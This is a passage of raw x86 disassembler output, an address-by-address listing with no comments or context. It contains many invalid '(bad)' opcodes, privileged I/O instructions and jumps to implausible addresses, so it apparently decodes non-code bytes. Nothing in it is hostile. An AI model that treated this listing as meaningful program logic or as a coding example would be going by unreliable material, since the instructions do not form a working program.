  43297e:	pop    ecx
  43297f:	sub    edi,esi
  432981:	push   edx
  432982:	mov    eax,0x1bf40086
  432987:	jmp    esi
  432989:	out    dx,al
  43298a:	test   al,0x98
  43298c:	jmp    0x4329da
  43298e:	jecxz  0x432963
  432990:	stc    
  432991:	push   ebx
  432992:	or     bh,BYTE PTR [edi]
  432994:	pop    ebx
  432995:	stos   BYTE PTR es:[edi],al
  432996:	repnz cmp al,0xbe
  432999:	clc    
  43299a:	sbb    ecx,DWORD PTR [eax+0xe0fc1c9]
  4329a0:	xor    bl,BYTE PTR [esi+ebp*4]
  4329a3:	add    eax,DWORD PTR [eax]
  4329a5:	hlt    
  4329a6:	call   0x27a:0x290effe5
  4329ad:	ja     0x432a0b
  4329af:	or     BYTE PTR [ecx+0x79],dl
  4329b2:	pop    ebx
  4329b3:	cdq    
  4329b4:	setle  BYTE PTR [ebx]
  4329b7:	push   cs
  4329b8:	xor    eax,0xffc36d1c
  4329bd:	cli    
  4329be:	pop    es
  4329bf:	jecxz  0x4329d1
  4329c1:	xor    al,0xee
  4329c3:	sbb    DWORD PTR [ebx],ecx
  4329c5:	inc    esp
  4329c6:	enter  0xfaf6,0x29
  4329ca:	ss ss aas 
  4329cd:	hlt    
  4329ce:	dec    edx
  4329cf:	stc    
  4329d0:	fwait
  4329d1:	in     eax,0xad
  4329d3:	inc    BYTE PTR [esp+esi*4-0x4bd1fe3f]
  4329da:	das    
  4329db:	jge    0x4329df
	...
  4329f5:	add    BYTE PTR [ebp+ebp*8-0x35cf80bf],al
  4329fc:	add    al,BYTE PTR [eax]
  4329fe:	and    edx,ebp
  432a00:	or     eax,0xff838c32
  432a05:	push   esp
  432a07:	outs   dx,BYTE PTR ds:[esi]
  432a08:	out    0xff,al
  432a0a:	sahf   
  432a0b:	sar    BYTE PTR [ecx+0x2],0x8b
  432a0f:	and    bl,0x3
  432a12:	jns    0x432a42
  432a14:	cdq    
  432a15:	or     ah,BYTE PTR [eax*1-0x24b4271e]
  432a1c:	and    eax,0xd1a6f04
  432a21:	cmc    
  432a22:	and    eax,DWORD PTR ds:0x6ec402be
  432a28:	jmp    0x9320333f
  432a2d:	(bad)  
  432a2e:	dec    ebx
  432a2f:	add    ebx,esp
  432a31:	outs   dx,DWORD PTR ds:[esi]
  432a32:	in     eax,0x44
  432a34:	jmp    0xedbd5ec1
  432a39:	aad    0x73
  432a3b:	lock in al,0x7c
  432a3e:	div    BYTE PTR [edi+eiz*8+0x6604f845]
  432a45:	inc    ebx
  432a46:	lock push esp
  432a48:	paddb  mm1,QWORD PTR [esi]
  432a4b:	cmp    ah,BYTE PTR [ecx+0x7204cb39]
  432a51:	clc    
  432a52:	xlat   BYTE PTR ds:[ebx]
  432a53:	adc    eax,0x883b0429
  432a58:	in     al,0xe7
	...
  432a72:	add    bh,dh
  432a74:	add    al,0xd4
  432a76:	pop    es
  432a77:	sbb    eax,ebp
  432a79:	cmp    eax,0x578def5
  432a7e:	or     BYTE PTR [edx+0x5],dl
  432a81:	inc    edx
  432a82:	fsubr  DWORD PTR [ebx-0x30fc5a26]
  432a88:	sbb    DWORD PTR ds:0x270503f5,ecx
  432a8e:	pop    es
  432a8f:	hlt    
  432a90:	xchg   DWORD PTR [edi+eiz*8-0xa6afb09],esp
  432a97:	scas   al,BYTE PTR es:[edi]
  432a98:	js     0x432a67
  432a9a:	pop    es
  432a9b:	sbb    al,BYTE PTR ds:0xdac3d80a
  432aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432aa2:	add    ecx,DWORD PTR [edi-0x340b2ee7]
  432aa8:	add    al,0x0
  432aaa:	sub    edi,ebx
  432aac:	add    al,0x52
  432aae:	(bad)  
  432aaf:	out    0x89,eax
  432ab1:	cli    
  432ab2:	pop    ebp
  432ab3:	ins    DWORD PTR es:[edi],dx
  432ab4:	mov    cl,dh
  432ab6:	push   ebp
  432ab7:	popa   
  432ab8:	dec    ebp
  432ab9:	sti    
  432aba:	sbb    eax,0xcecfecbd
  432abf:	add    eax,0x6bbf8500
  432ac4:	repnz push edx
  432ac6:	sar    DWORD PTR [esi-0x79490501],1
  432acc:	ret    0x1651
  432acf:	xchg   DWORD PTR [edx-0x75d4328d],ecx
  432ad5:	jnp    0x432a9c
	...
  432aef:	add    BYTE PTR [edi],ah
  432af1:	mov    cl,BYTE PTR [ebx-0x33]
  432af4:	pslld  mm4,QWORD PTR [ebx-0x41a29ad0]
  432afb:	cmc    
  432afc:	test   DWORD PTR [ecx+0x5503f5c8],0xb1bfd87
  432b06:	(bad)  
  432b07:	in     eax,0xf9
  432b09:	sub    esi,ebp
  432b0b:	mov    cl,0xae
  432b0d:	mov    BYTE PTR [ebx],dl
  432b0f:	out    0x6f,eax
  432b11:	adc    eax,0xc0a65e75
  432b16:	add    ebp,ecx
  432b18:	popf   
  432b19:	push   DWORD PTR [ebx+0xd]
  432b1c:	hlt    
  432b1d:	in     al,dx
  432b1e:	addr16 ds in eax,0xfd
  432b22:	xchg   BYTE PTR [ecx],bh
  432b24:	jnp    0x432b1d
  432b26:	jae    0x432b03
  432b28:	in     al,0x78
  432b2a:	and    al,0xf5
  432b2c:	add    al,0x79
  432b2e:	and    al,0xed
  432b30:	ins    DWORD PTR es:[edi],dx
  432b31:	call   DWORD PTR [eiz*4+0x6a00429d]
  432b38:	sub    al,0x11
  432b3a:	xchg   DWORD PTR [eax],eax
  432b3c:	jecxz  0x432af4
  432b3e:	mov    esp,0x7819d08
  432b43:	push   esi
  432b44:	push   ss
  432b45:	sbb    ebx,edi
  432b47:	retf   0x74f5
  432b4a:	idiv   bh
  432b4c:	pop    edx
  432b4d:	mov    bh,BYTE PTR [edi+0x2e7ff474]
  432b53:	add    eax,DWORD PTR [eax]
	...
  432b6d:	add    bh,BYTE PTR [eax+0x4f174f5]
  432b73:	dec    esi
  432b74:	push   DWORD PTR [eax]
  432b76:	ret    0x4010
  432b79:	pop    ebp
  432b7a:	mov    ebx,eax
  432b7c:	or     al,0x4c
  432b7e:	cmc    
  432b7f:	add    esi,0xc02b0836
  432b85:	mov    ebx,0xe300044a
  432b8a:	mov    ebx,0x9244ff29
  432b8f:	push   ds
  432b90:	or     al,0x3
  432b92:	cli    
  432b93:	xor    ecx,0xc821626
  432b99:	adc    eax,DWORD PTR [eax-0x64a8c5f0]
  432b9f:	add    eax,0x76cfcd47
  432ba4:	and    al,0xe9
  432ba6:	xchg   edi,eax
  432ba7:	in     eax,0x33
  432ba9:	sbb    eax,0xd1c258b5
  432bae:	add    eax,0x51fb607
  432bb3:	scas   al,BYTE PTR es:[edi]
  432bb4:	shl    esi,0x4a
  432bb7:	jecxz  0x432baa
  432bb9:	or     bl,BYTE PTR [edx+0x5b7081e]
  432bbf:	div    DWORD PTR [ecx+esi*8+0x4]
  432bc3:	not    DWORD PTR ds:0x3afb6d
  432bc9:	push   ds
  432bca:	dec    edx
  432bcb:	or     al,0xc2
  432bcd:	hlt    
  432bce:	jecxz  0x432bce
  432bd0:	push   ecx
	...
  432be9:	add    BYTE PTR [ebx-0x2b],al
  432bec:	stos   BYTE PTR es:[edi],al
  432bed:	and    eax,DWORD PTR [eax]
  432bef:	jle    0x432bd5
  432bf1:	sub    BYTE PTR [eax],ch
  432bf3:	enter  0x2efa,0x83
  432bf7:	cmovg  di,WORD PTR [ebx+0x77]
  432bfc:	jecxz  0x432c11
  432bfe:	retf   0xf8ea
  432c01:	push   edi
  432c02:	add    ch,BYTE PTR [esp+eax*1]
  432c05:	jg     0x432c3f
  432c07:	out    0x87,eax
  432c09:	shl    al,0xe2
  432c0c:	rol    DWORD PTR [ecx+0xf],0x48
  432c10:	call   0xcf0bee20
  432c15:	mov    edi,0x83e19a3
  432c1a:	hlt    
  432c1b:	inc    dx
  432c1d:	out    0x2b,eax
  432c1f:	in     al,0xc2
  432c21:	and    esi,eax
  432c23:	push   ds
  432c24:	out    0x36,eax
  432c26:	sub    al,0x22
  432c28:	repz jae 0x432c30
  432c2b:	mov    DWORD PTR [ebx+0x50],0x23978aa5
  432c32:	clc    
  432c33:	cmp    cl,0x4b
  432c36:	jmp    0x4edf:0x307f042b
  432c3d:	add    edi,ebx
  432c3f:	in     al,dx
  432c40:	sar    BYTE PTR [edi+0x54feeab6],1
  432c46:	outs   dx,DWORD PTR ds:[esi]
  432c47:	dec    edx
  432c48:	jg     0x432c36
  432c4a:	cmp    al,0x69
  432c4c:	inc    esp
  432c4d:	or     eax,DWORD PTR [eax]
	...
  432c67:	js     0x432ca3
  432c69:	add    al,0x0
  432c6b:	hlt    
  432c6c:	push   0x32780b12
  432c71:	add    al,0x0
  432c73:	hlt    
  432c74:	ins    BYTE PTR es:[edi],dx
  432c75:	int3   
  432c76:	inc    esp
  432c77:	inc    esi
  432c78:	add    eax,0x1b27b3a6
  432c7d:	ins    BYTE PTR es:[edi],dx
  432c7e:	ror    DWORD PTR [edi+0x56],0x7f
  432c82:	add    ebp,DWORD PTR [ecx+0x52]
  432c85:	xor    DWORD PTR [ebp+0xde2279b],esi
  432c8b:	(bad)
  432c8f:	imul   BYTE PTR [edx-0xb]
  432c92:	sbb    al,0x50
  432c94:	add    eax,0xfbf303e9
  432c99:	icebp  
  432c9a:	(bad)  
  432c9b:	jbe    0x432c37
  432c9d:	call   0xd4320a5
  432ca2:	jno    0x432cc2
  432ca4:	test   BYTE PTR [esi],ah
  432ca6:	add    al,0x7b
  432ca8:	inc    ebp
  432ca9:	icebp  
  432caa:	call   0xe300a77d
  432caf:	pop    edx
  432cb0:	jg     0x432d10
  432cb2:	ret    
  432cb3:	imul   ebx
  432cb5:	das    
  432cb6:	adc    esi,0x4
  432cb9:	mov    ss,WORD PTR [ebp-0xbd74802]
  432cbf:	sbb    ch,BYTE PTR [edi-0x1e]
  432cc2:	push   esi
  432cc3:	mov    ah,0x12
  432cc5:	jle    0x432c62
  432cc7:	(bad)  
  432cc8:	mov    bh,0x30
	...
  432ce2:	add    BYTE PTR [eax],al
  432ce4:	push   es
  432ce5:	(bad)  
  432ce6:	out    0x97,al
  432ce8:	cmc    
  432ce9:	(bad)  
  432cec:	out    0xeb,eax
  432cee:	(bad)  
  432cf0:	mov    ch,0xc5
  432cf2:	push   eax
  432cf3:	add    ch,BYTE PTR [ebx-0x33]
  432cf6:	pop    edx
  432cf7:	sbb    ch,BYTE PTR [edi]
  432cf9:	test   dl,ah
  432cfb:	push   cs
  432cfc:	rcl    DWORD PTR [eax+0x53],cl
  432cff:	ret    
  432d00:	dec    DWORD PTR [eax]
  432d02:	mov    ebp,0xa8b7ff05
  432d07:	cmc    
  432d08:	fidivr DWORD PTR [esi]
  432d0a:	add    BYTE PTR [edx-0x1],ch
  432d0d:	sti    
  432d0e:	out    0xf0,al
  432d10:	mov    dl,0xb2
  432d12:	aas    
  432d13:	add    ecx,DWORD PTR [edi]
  432d15:	xor    BYTE PTR [ebx],cl
  432d17:	push   esi
  432d18:	mov    bh,0x1b
  432d1a:	out    0xc4,eax
  432d1c:	call   0x88cc:0xf6f147b2
  432d23:	imul   esi
  432d25:	sub    ebx,eax
  432d27:	out    0xcf,eax
  432d29:	push   0x40
  432d2b:	jmp    0x364e4f0e
  432d30:	aaa    
  432d31:	or     esi,ebx
  432d33:	mov    ecx,0x960b150d
  432d38:	cmp    BYTE PTR [ebx],cl
  432d3a:	rol    ecx,0xec
  432d3d:	out    0x2,eax
  432d3f:	fisubr WORD PTR [eax-0x1757f3bc]
  432d45:	or     DWORD PTR [edi-0x37],edi
	...
  432d60:	add    bh,dh
  432d62:	lea    eax,[ecx]
  432d64:	cli    
  432d65:	mov    bh,0xcd
  432d67:	mov    esi,0xfde80343
  432d6c:	adc    bh,dl
  432d6e:	pop    esp
  432d6f:	leave  
  432d70:	stos   BYTE PTR es:[edi],al
  432d71:	test   al,0xa2
  432d73:	jge    0x432da0
  432d75:	lock mov ah,0x7d
  432d78:	sub    edi,eax
  432d7a:	mov    dh,0x7d
  432d7c:	sub    esi,eax
  432d7e:	les    edi,FWORD PTR [ebp+0x2b]
  432d81:	clc    
  432d82:	ret    0x2b7d
  432d85:	lock mov ecx,0xe8f82b7d
  432d8b:	jge    0x432d38
  432d8d:	div    edi
  432d8f:	jge    0x432d3c
  432d91:	div    ebp
  432d93:	jge    0x432d40
  432d95:	test   DWORD PTR [ebx],0xb7f7ab7f
  432d9b:	jge    0x432d9d
  432d9d:	lahf   
  432d9e:	add    al,BYTE PTR [ebx]
  432da0:	or     DWORD PTR [edi-0x707cf4fe],0x2
  432da7:	adc    eax,DWORD PTR [ebx-0x7cdbfda1]
  432dad:	pop    edi
  432dae:	add    dl,bh
  432db0:	or     BYTE PTR [edi+0x2],0x55
  432db4:	mov    esi,ecx
  432db6:	sub    ebx,0x29f14
  432dbc:	add    DWORD PTR [eax+0xa],0xfffffff7
  432dc0:	push   ebx
  432dc1:	imul   edx,esp,0xffffffd1
  432dc4:	push   0x0
	...
  432dde:	mov    DWORD PTR [edi-0x7b],edi
  432de1:	in     al,dx
  432de2:	pusha  
  432de3:	adc    edi,esi
  432de5:	push   eax
  432de6:	push   edx
  432de7:	xchg   edi,eax
  432de8:	add    ch,BYTE PTR [edx+0x5b]
  432deb:	stos   BYTE PTR es:[edi],al
  432dec:	loop   0x432df3
  432dee:	retf   
  432def:	adc    bh,dh
  432df1:	(bad)  
  432df2:	fcomp  DWORD PTR ds:0xb232fffd
  432df8:	cmc    
  432df9:	jne    0x432e4c
  432dfb:	adc    DWORD PTR [ebp+0x18],esi
  432dfe:	xor    eax,0x62ff3707
  432e03:	jge    0x432df5
  432e05:	test   DWORD PTR [ebx+0x833996],ecx
  432e0b:	stc    
  432e0c:	cli    
  432e0d:	jae    0x432e2c
  432e0f:	adc    DWORD PTR [ebp+0x10],esi
  432e12:	adc    BYTE PTR [edi-0x71d700ee],0x9
  432e19:	inc    eax
  432e1a:	or     eax,0x3974bf87
  432e1f:	adc    DWORD PTR [ebp+0x14],esi
  432e22:	push   eax
  432e23:	(bad)  
  432e24:	repnz push 0xffffffdc
  432e27:	fwait
  432e28:	cli    
  432e29:	addr16 int 0x1
  432e2c:	add    al,al
  432e2e:	hlt    
  432e2f:	push   esi
  432e30:	xchg   edx,eax
  432e31:	pop    ss
  432e32:	fdiv   QWORD PTR [ecx+0x6a]
  432e35:	cli    
  432e36:	retf   
  432e37:	outs   dx,DWORD PTR ds:[esi]
  432e38:	aas    
  432e39:	jne    0x432e1a
  432e3b:	ds repnz or esp,edi
  432e3f:	stos   DWORD PTR es:[edi],eax
  432e40:	(bad)  
  432e41:	jle    0x432e43
	...
  432e5b:	lods   al,BYTE PTR ds:[esi]
  432e5c:	fwait
  432e5d:	xchg   edx,eax
  432e5e:	add    ch,cl
  432e60:	pop    esi
  432e61:	(bad)  
  432e62:	push   esp
  432e64:	cwde   
  432e65:	add    edi,edx
  432e67:	mov    bh,0x6b
  432e69:	or     BYTE PTR [esi+eax*1+0x62],ah
  432e6d:	shl    cl,1
  432e6f:	jns    0x432e21
  432e71:	push   es
  432e72:	call   0xfb508f8b
  432e77:	outs   dx,DWORD PTR ds:[esi]
  432e78:	sub    eax,0x293d56ad
  432e7d:	repz inc eax
  432e80:	jb     0x432e9a
  432e82:	push   ecx
  432e83:	lds    edx,FWORD PTR [ecx+0x4]
  432e86:	mov    eax,0xfffd11db
  432e8b:	pop    ebx
  432e8c:	(bad)  
  432e8d:	jg     0x432e8a
  432e8f:	dec    ebx
  432e90:	test   BYTE PTR [ebx],bl
  432e92:	inc    DWORD PTR [ebx-0x15]
  432e95:	jns    0x432e68
  432e97:	inc    ebx
  432e98:	leave  
  432e99:	jl     0x432ee0
  432e9b:	sub    al,0x41
  432e9d:	add    al,0x87
  432e9f:	xor    eax,0xcfbb174
  432ea4:	idiv   DWORD PTR [edi-0x5]
  432ea7:	sbb    ebx,edx
  432ea9:	cmp    edi,edi
  432eab:	mov    eax,0xe6ff9993
  432eb0:	cmp    BYTE PTR [eax],cl
  432eb2:	push   0xfffec6e4
  432eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432eb8:	sbb    ebx,DWORD PTR [esi+esi*8]
  432ebb:	loop   0x432eab
  432ebd:	(bad)  
  432ebe:	inc    BYTE PTR [eax]
	...
  432ed8:	repnz add al,0xf6
  432edb:	mov    dl,0xf7
  432edd:	(bad)  
  432ede:	loop   0x432f5c
  432ee0:	inc    esi
  432ee1:	add    DWORD PTR [eax],esp
  432ee3:	inc    edi
  432ee4:	jnp    0x432f27
  432ee6:	add    eax,0xd4102f4
  432eeb:	cld    
  432eec:	inc    esi
  432eed:	push   ss
  432eee:	mov    bh,0xfd
  432ef0:	jb     0x432f33
  432ef2:	or     eax,0x540eaf8
  432ef7:	add    BYTE PTR [edi],ah
  432ef9:	add    dl,dh
  432efb:	inc    ebx
  432efc:	xor    al,0xf0
  432efe:	out    0xd6,al
  432f00:	pop    ebx
  432f01:	xbegin 0xfcd3580a
  432f07:	xchg   BYTE PTR [eax+0x26b19635],bl
  432f0d:	mov    ah,BYTE PTR [ebx-0x5475dbd1]
  432f13:	pop    ds
  432f14:	les    ecx,FWORD PTR [ecx-0x703be85d]
  432f1a:	sub    edi,esp
  432f1c:	jo     0x432f78
  432f1e:	mov    ebp,0xd29bee1b
  432f23:	or     bh,BYTE PTR [eax-0x3b]
  432f26:	fnstcw WORD PTR [edi+0x49]
  432f29:	add    eax,0x427b03e9
  432f2e:	in     eax,dx
  432f2f:	jle    0x432f0d
  432f31:	(bad)  
  432f32:	xor    BYTE PTR [eax],al
  432f34:	jnp    0x432efa
  432f36:	pop    ebp
  432f37:	push   ss
  432f38:	bound  eax,QWORD PTR ds:0x2029
	...
  432f52:	add    BYTE PTR [eax],al
  432f54:	add    ah,cl
  432f56:	mov    ebp,0x4f40068
  432f5b:	rol    al,1
  432f5d:	and    esi,DWORD PTR [edi-0x11]
  432f60:	xchg   edx,eax
  432f61:	lock cmp eax,0x179217fc
  432f67:	jp     0x432ef9
  432f69:	or     ecx,DWORD PTR [eax]
  432f6b:	add    BYTE PTR [ebx-0x2],bh
  432f6e:	jno    0x432f5c
  432f70:	fidiv  DWORD PTR [eax]
  432f72:	push   ebp
  432f73:	push   edx
  432f74:	push   ecx
  432f75:	je     0x432f76
  432f77:	cli    
  432f78:	pop    esi
  432f79:	cli    
  432f7a:	cli    
  432f7b:	xor    BYTE PTR [ecx],ch
  432f7d:	push   ebx
  432f7e:	lds    ecx,FWORD PTR [edx]
  432f80:	gs dec esp
  432f82:	add    eax,0xc842e900
  432f87:	xchg   BYTE PTR [edx],bh
  432f89:	test   al,0x40
  432f8b:	call   0x5b9d14b
  432f90:	lock test bh,ah
  432f93:	ins    DWORD PTR es:[edi],dx
  432f94:	cli    
  432f95:	out    dx,al
  432f96:	jno    0x432f80
  432f98:	jmp    0xc48a:0xd750001
  432f9f:	dec    edi
  432fa0:	mov    bh,0xef
  432fa2:	pop    esp
  432fa3:	sti    
  432fa4:	push   es
  432fa5:	out    dx,al
  432fa6:	jecxz  0x432fa5
  432fa8:	mov    edx,0x7dbf8137
  432fad:	xchg   ebx,eax
  432fae:	add    dl,0x62
  432fb1:	add    bh,BYTE PTR [esi]
  432fb3:	inc    ebp
  432fb4:	leave  
  432fb5:	mov    dl,BYTE PTR [ecx]
  432fb7:	jae    0x432f9d
	...
  432fd1:	add    BYTE PTR [esi],ch
  432fd3:	jo     0x432fb1
  432fd5:	pop    ebx
  432fd6:	dec    ecx
  432fd7:	(bad)  
  432fd8:	je     0x432fa3
  432fda:	icebp  
  432fdb:	jmp    0x19c1:0xc0c3cfa
  432fe2:	xchg   bl,ah
  432fe4:	sub    dh,BYTE PTR [esi-0x14190003]
  432fea:	inc    ecx
  432feb:	mov    ebx,0x3284a983
  432ff0:	xchg   DWORD PTR [esi+0x2c38eb99],esp
  432ff6:	loopne 0x433062
  432ff8:	push   ss
  432ff9:	push   ss
  432ffa:	or     edi,DWORD PTR [esi*2+0x9926100]
  433001:	inc    DWORD PTR [eax]
  433003:	das    
  433004:	sti    
  433005:	icebp  
  433006:	push   0xffffff8a
  433008:	into   
  433009:	adc    ebx,DWORD PTR [ecx+esi*4+0xdd3e850]
  433010:	idiv   edi
  433012:	inc    esi
  433013:	add    ebp,DWORD PTR [edx]
  433015:	shl    BYTE PTR [ecx+0x41],0x74
  433019:	adc    dl,BYTE PTR [esi-0x46]
  43301c:	or     al,BYTE PTR [ebp-0x7d026af3]
  433022:	lds    ecx,FWORD PTR ds:0xda1487b
  433028:	mov    al,0x1
  43302a:	ss (bad) 
  43302c:	cmp    DWORD PTR [ebp-0x57],0x5f47573
  433033:	ja     0x43302b
  433035:	inc    DWORD PTR [eax]
	...
  43304f:	jmp    0xf8a:0x9d107c7f
  433056:	push   0xffffff85
  433058:	jns    0x433018
  43305a:	push   eax
  43305b:	jp     0x432fe8
  43305d:	or     bh,bh
  43305f:	push   eax
  433060:	mov    dl,0x10
  433062:	inc    eax
  433063:	pop    ebp
  433064:	add    ebx,0x2a2e60c
  43306a:	lea    edx,[eax]
  43306c:	adc    eax,0xb10d5050
  433071:	loop   0x43308f
  433073:	fimul  DWORD PTR [ebx]
  433075:	neg    DWORD PTR [edi+0x1b]
  433078:	test   al,0xc7
  43307a:	ret    0x649
  43307d:	push   ebp
  43307e:	mov    edi,DWORD PTR [ecx]
  433080:	xchg   ebx,ebp
  433082:	sbb    BYTE PTR [edi],bl
  433084:	push   es
  433085:	add    BYTE PTR [ebx-0x1d],dl
  433088:	mov    bl,0xf5
  43308a:	jne    0x433095
  43308c:	jae    0x433013
  43308e:	in     al,dx
  43308f:	hlt    
  433090:	nop
  433091:	pop    es
  433092:	sti    
  433093:	or     edx,DWORD PTR [ecx]
  433095:	cld    
  433096:	dec    edi
  433097:	or     al,0x92
  433099:	ret    0xfbfa
  43309c:	jbe    0x4330ad
  43309e:	test   edx,ebp
  4330a0:	loop   0x43311c
  4330a2:	ret    
  4330a3:	hlt    
  4330a4:	jmp    0x4330a4
  4330a6:	popa   
  4330a7:	ja     0x4330ca
  4330a9:	add    al,0xb
  4330ab:	jo     0x433045
  4330ad:	(bad)  
  4330ae:	push   esp
  4330b0:	outs   dx,BYTE PTR ds:[esi]
  4330b1:	mov    dl,0xb
	...
  4330cb:	add    bl,cl
  4330cd:	push   ds
  4330ce:	or     DWORD PTR [ebp-0x7312473d],eax
  4330d4:	jno    0x43311d
  4330d6:	add    bh,bl
  4330d8:	mov    bl,0x9b
  4330da:	pop    es
  4330db:	adc    eax,0xffbede74
  4330e0:	js     0x43310d
  4330e2:	mov    eax,DWORD PTR [esp+ebx*2]
  4330e5:	jmp    0x4330e5
  4330e7:	push   esi
  4330e9:	mov    ebx,0xe31dfe9c
  4330ee:	xchg   esi,eax
  4330ef:	inc    DWORD PTR [ebx+0x718cbeeb]
  4330f5:	pop    es
  4330f6:	add    bh,bl
  4330f8:	jae    0x433095
  4330fa:	jno    0x433141
  4330fc:	clc    
  4330fd:	add    edx,DWORD PTR [esi+0x7fe26296]
  433103:	shl    al,0x63
  433106:	jns    0x43314d
  433108:	dec    eax
  433109:	cmp    eax,DWORD PTR [ecx+0x1fac1fb]
  43310f:	jne    0x4330f5
  433111:	jo     0x4330d4
  433113:	or     esp,DWORD PTR [ebx+edx*8-0x4dcc064c]
  43311a:	jg     0x4330dc
  43311c:	mov    al,ds:0x287d7f4b
  433121:	add    al,0xa2
  433123:	xchg   ecx,eax
  433124:	rol    BYTE PTR [ebp+0x6f0f0c1b],cl
  43312a:	int3   
  43312b:	scas   al,BYTE PTR es:[edi]
  43312c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43312d:	xchg   DWORD PTR [ebx],esp
  43312f:	adc    BYTE PTR [eax],al
	...
  433149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43314a:	stc    
  43314b:	sti    
  43314c:	idiv   esi
  43314e:	push   cs
  43314f:	mov    ecx,0x6c0533f1
  433154:	inc    esp
  433155:	rcl    DWORD PTR ds:0x55e7c15c,cl
  43315b:	mov    ecx,0xed5a68b3
  433160:	sbb    edx,DWORD PTR [ebp-0x69]
  433163:	push   edx
  433164:	pop    es
  433165:	jo     0x43312c
  433167:	aam    0xd6
  433169:	mov    esi,0xe106f572
  43316e:	add    dh,dl
  433170:	ret    
  433171:	mov    bl,0x83
  433173:	mov    ds:0xa24faef7,eax
  433178:	push   es
  433179:	or     ecx,eax
  43317b:	cmc    
  43317c:	ret    
  43317d:	fwait
  43317e:	sub    DWORD PTR [eax],0x665ef990
  433184:	(bad)  
  433185:	mov    eax,DWORD PTR [edi]
  433187:	fs test eax,0x7901f87e
  43318d:	xor    DWORD PTR [ecx],ecx
  43318f:	adc    DWORD PTR [esi],esp
  433191:	mov    dh,bh
  433193:	icebp  
  433194:	push   ebx
  433195:	cmc    
  433196:	jmp    0x433176
  433198:	js     0x433153
  43319a:	or     cl,dl
  43319c:	xor    DWORD PTR [edx-0x6c2e2609],eax
  4331a2:	pop    eax
  4331a3:	xor    ebp,DWORD PTR [ebx+0x3dcc33c]
  4331a9:	adc    eax,ebp
  4331ab:	dec    esi
  4331ac:	fadd   DWORD PTR [eax]
	...
  4331c6:	stos   DWORD PTR es:[edi],eax
  4331c7:	lea    esp,[edx]
  4331c9:	cld    
  4331ca:	jl     0x43320b
  4331cc:	add    ch,ah
  4331ce:	test   al,0x42
  4331d0:	adc    BYTE PTR [ecx+eiz*2+0x16],bl
  4331d4:	das    
  4331d5:	mov    al,0x67
  4331d7:	ret    
  4331d8:	inc    ecx
  4331d9:	in     eax,0xf8
  4331db:	add    al,0x0
  4331dd:	jmp    0x632b34ac
  4331e2:	aaa    
  4331e3:	clc    
  4331e4:	fs jo  0x433228
  4331e7:	adc    al,0xfb
  4331e9:	aam    0xa7
  4331eb:	adc    eax,0xc076e940
  4331f0:	or     esp,DWORD PTR [edx+0x21]
  4331f3:	mov    eax,0xed007251
  4331f8:	push   cs
  4331f9:	jmp    0xae3536f5
  4331fe:	stos   DWORD PTR es:[edi],eax
  4331ff:	inc    DWORD PTR [eax]
  433201:	aad    0xc1
  433203:	push   ebp
  433204:	call   0xfb3f1ffb
  433209:	jb     0x4331fc
  43320b:	pop    edx
  43320c:	mov    esi,0x417ff7ed
  433211:	loope  0x4331f5
  433213:	add    ch,al
  433215:	jb     0x4331ce
  433217:	test   DWORD PTR [ebx+0x50028329],0xf038416
  433221:	test   eax,0xd971fbf7
  433226:	fucomip st,st(5)
  433228:	clc    
  433229:	inc    BYTE PTR [eax]
	...
  433243:	stc    
  433244:	ret    
  433245:	add    DWORD PTR [ecx+0x2a00377a],edx
  43324b:	jbe    0x4332c7
  43324d:	or     cl,ch
  43324f:	push   0x15
  433251:	jmpw   0x29c2
  433255:	push   0xf9f76de8
  43325a:	hlt    
  43325b:	xor    edx,DWORD PTR [eax+eax*2]
  43325e:	add    BYTE PTR [ebp+0x7a],cl
  433261:	or     BYTE PTR ds:[eax+0x5e017540],bl
  433268:	aad    0xba
  43326a:	inc    eax
  43326b:	dec    esi
  43326c:	icebp  
  43326d:	lods   eax,DWORD PTR ds:[esi]
  43326e:	inc    ecx
  43326f:	sbb    DWORD PTR [edi+esi*8+0x2b05ea2c],eax
  433276:	rcr    BYTE PTR [esi-0xf],0xb0
  43327a:	dec    ecx
  43327b:	add    eax,0x26d4bf84
  433280:	inc    edx
  433281:	mov    ebx,0x7b1d6655
  433286:	in     al,dx
  433287:	mov    ebp,0x658b4da8
  43328c:	aam    0xba
  43328e:	inc    eax
  43328f:	pusha  
  433290:	xchg   dh,bl
  433292:	call   0x3e0a20
  433297:	xor    eax,0x32ff8172
  43329c:	jp     0x4332e3
  43329e:	cld    
  43329f:	inc    eax
  4332a0:	mov    dh,0xea
  4332a2:	push   eax
  4332a3:	repnz in eax,0x52
  4332a6:	adc    DWORD PTR [eax],eax
	...
  4332c0:	pop    ebp
  4332c1:	add    al,BYTE PTR [ebp+0x1fee68c0]
  4332c7:	inc    ebp
  4332c8:	stc    
  4332c9:	call   DWORD PTR [eax+ebx*1]
  4332cc:	mov    es,edx
  4332ce:	cli    
  4332cf:	mov    BYTE PTR [eax+0x12],bl
  4332d2:	bound  edx,QWORD PTR [esi*8-0x72ffe348]
  4332d9:	mov    dl,0x8b
  4332db:	inc    ebp
  4332dc:	stc    
  4332dd:	sbb    BYTE PTR [edi-0x7bfda2db],dl
  4332e3:	shr    cl,0xd1
  4332e6:	fs or  al,ah
  4332e9:	mov    dh,0xea
  4332eb:	push   eax
  4332ec:	loopne 0x4332a4
  4332ee:	fsubp  st(0),st
  4332f0:	hlt    
  4332f1:	pusha  
  4332f2:	(bad)  
  4332f4:	inc    ebx
  4332f5:	pusha  
  4332f6:	aas    
  4332f7:	je     0x4332d3
  4332f9:	push   ecx
  4332fa:	add    BYTE PTR [ebp-0x73514847],cl
  433300:	mov    cl,0xc7
  433302:	push   ss
  433303:	ja     0x4332de
  433305:	jmp    0x433305
  433307:	xor    DWORD PTR [eax+ebx*1],0xfffffff8
  43330b:	mov    WORD PTR [ecx-0x2deee981],?
  433311:	jmp    0x433311
  433313:	xor    DWORD PTR [ecx+edx*1],0xffffffe2
  433317:	gs loopne 0x43332b
  43331a:	add    al,0x53
  43331c:	repz shr BYTE PTR [esi-0x6713cbef],1
  433323:	pop    es
	...
  43333c:	add    BYTE PTR [ecx+0x20],dh
  43333f:	adc    al,0x50
  433341:	ja     0x433369
  433343:	repz push edx
  433345:	shl    eax,cl
  433347:	mov    dl,0x11
  433349:	xor    al,0xec
  43334b:	jg     0x433311
  43334d:	fcomp  QWORD PTR [eax-0x46]
  433350:	jecxz  0x43331e
  433352:	(bad)  
  433354:	push   DWORD PTR [ebx-0x48375b6a]
